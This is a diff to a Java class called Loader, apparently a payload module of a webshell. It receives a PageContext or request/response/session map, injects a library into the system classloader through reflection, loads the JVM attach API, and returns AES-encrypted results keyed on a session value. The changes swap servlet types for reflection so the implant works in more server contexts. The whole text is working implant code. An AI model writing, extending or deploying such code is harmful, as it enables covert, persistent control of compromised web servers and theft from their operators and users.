@@ -10,45 +10,69 @@ import java.util.List;
 import java.util.Map;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpSession;
-import javax.servlet.jsp.PageContext;
 
 public class Loader {
    public static String libPath;
-   private ServletRequest Request;
-   private ServletResponse Response;
-   private HttpSession Session;
+   private Object Request;
+   private Object Response;
+   private Object Session;
 
    public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      this.Session = page.getSession();
-      this.Response = page.getResponse();
-      this.Request = page.getRequest();
       HashMap result = new HashMap();
+      boolean var15 = false;
 
-      try {
-         URL url = (new File(libPath)).toURI().toURL();
-         URLClassLoader urlClassLoader = (URLClassLoader)ClassLoader.getSystemClassLoader();
-         Method add = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
-         add.setAccessible(true);
-         add.invoke(urlClassLoader, url);
-         result.put("status", "success");
-      } catch (Exception var8) {
-         result.put("status", "fail");
-         result.put("msg", var8.getMessage());
+      Object so;
+      Method write;
+      label77: {
+         try {
+            var15 = true;
+            this.fillContext(obj);
+            URL url = (new File(libPath)).toURI().toURL();
+            URLClassLoader urlClassLoader = (URLClassLoader)ClassLoader.getSystemClassLoader();
+            Method add = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
+            add.setAccessible(true);
+            add.invoke(urlClassLoader, url);
+            Class c = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachine");
+            result.put("status", "success");
+            var15 = false;
+            break label77;
+         } catch (Exception var19) {
+            result.put("status", "fail");
+            result.put("msg", var19.getMessage());
+            var15 = false;
+         } finally {
+            if (var15) {
+               try {
+                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getDeclaredMethod("write", byte[].class);
+                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                  so.getClass().getDeclaredMethod("flush").invoke(so);
+                  so.getClass().getDeclaredMethod("close").invoke(so);
+               } catch (Exception var16) {
+               }
+
+            }
+         }
+
+         try {
+            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+            so.getClass().getDeclaredMethod("flush").invoke(so);
+            so.getClass().getDeclaredMethod("close").invoke(so);
+         } catch (Exception var17) {
+         }
+
+         return true;
       }
 
       try {
-         ServletOutputStream so = this.Response.getOutputStream();
-         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-         so.flush();
-         so.close();
-         page.getOut().clear();
-      } catch (Exception var7) {
-         var7.printStackTrace();
+         so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+         write = so.getClass().getDeclaredMethod("write", byte[].class);
+         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+         so.getClass().getDeclaredMethod("flush").invoke(so);
+         so.getClass().getDeclaredMethod("close").invoke(so);
+      } catch (Exception var18) {
       }
 
       return true;
@@ -112,12 +136,27 @@ public class Loader {
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getAttribute("u").toString();
+      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
       return encrypted;
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = objMap.get("session");
+         this.Response = objMap.get("response");
+         this.Request = objMap.get("request");
+      }
+
+      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
 }
